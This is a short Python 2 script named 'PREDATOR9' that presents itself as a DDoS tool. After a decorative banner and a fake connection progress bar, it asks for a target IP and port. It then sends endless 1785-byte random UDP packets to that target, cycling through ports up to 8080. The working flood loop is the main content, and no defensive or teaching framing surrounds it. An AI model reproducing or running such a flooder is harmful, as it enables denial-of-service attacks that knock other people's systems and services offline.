#!/usr/bin/python

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1785)
#############

class Colors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[21m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

os.system("clear")
def show_banner(self):
        print (Colors.BLUE) + (Colors.BOLD) + ("  -----------------------                                      ")
print "###################################"
print "#---------------------------------#"
print (Colors. CYAN) + (Colors.BOLD) + ("#-anyone cant't give your privacy-#") + (Colors.ENDC)
print "#----/-_----------------->--------#"
print "#---------------------->----------#"
print (Colors. CYAN) + (Colors.BOLD) + ("#---That's your responsibility----#") + (Colors.ENDC)
print "###################################"
word = 'B.L.A.C.K'
for char in word:
    print(char)
print "                    _       _                ___"
print " _ __  _ __ ___  __| | __ _| |_ ___  _ __   / _ \ "
print "| '_ \| '__/ _ \/ _` |/ _` | __/ _ \| '__| | (_) |"
print (Colors. PURPLE) + (Colors.BOLD) + ("| |_) | | |  __/ (_| | (_| | || (_) | |     \__, |") + (Colors.ENDC)
print (Colors. PURPLE) + (Colors.BOLD) + ("| .__/|_|  \___|\__,_|\__,_|\__\___/|_|       /_/") + (Colors.ENDC)
print (Colors. PURPLE) + (Colors.BOLD) + ("|_|") + (Colors.ENDC)
print (Colors. CYAN) + (Colors.BOLD) + ("PREDATOR9\n") + (Colors.ENDC)
print (Colors. BLUE) + (Colors.BOLD) + ("CODER-> Ajay\n") + (Colors.ENDC)
ip = raw_input("Target IP: ")
port = input("Traget Port: ")

os.system("clear")
word = '----------------------------------------------------------------->'
for char in word:
    print(char)

print "[connecting........] ! "
print " 0.00% "
time.sleep(0.5)
print ">>-> 0.50% "
time.sleep(0.5)
print ">>---> 5.00% "
time.sleep(0.5)
print ">>-----> 25%"
time.sleep(0.6)
print ">>----------> 50%"
time.sleep(0.7)
print ">>----------------> 75%"
time.sleep(0.8)
print ">>---------------------> 100%"
time.sleep(0)
print "[connected] !"
time.sleep(3)
print (Colors. BLUE) + (Colors.BOLD) + ("[connection:BlackSparrow] !") + (Colors.ENDC)
time.sleep(1)
print (Colors. YELLOW) + (Colors.BOLD) + ("[BlackSparrow] !") + (Colors.ENDC)
time.sleep(2)
print (Colors. CYAN) + (Colors.BOLD) + ("[BALCKsparrow -> DDOS] !") + (Colors.ENDC)
time.sleep(1.6)
sent = 10
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s BS [injecting]packet to %s open port:%s"%(sent,ip,port)
     if port == 8080:
       port = 1
